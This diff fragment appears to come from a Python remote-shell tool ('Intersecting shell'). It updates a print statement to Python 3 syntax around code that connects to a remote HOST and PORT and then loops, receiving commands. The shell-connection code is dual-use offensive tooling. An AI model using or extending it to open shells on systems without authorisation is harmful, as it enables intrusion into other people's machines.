@@ -33,11 +33,10 @@ try:
     conn.connect((HOST, PORT))
     print("[+] New connection established!")
     print("[+] Starting Intersecting shell....")
-    print "[+] Type ':help' to view all available commands"
+    print("[+] Type ':help' to view all available commands")
 except:
     print("[!] Connection error!")
     sys.exit(2)
-
 
 while True:
     data = conn.recv(socksize)
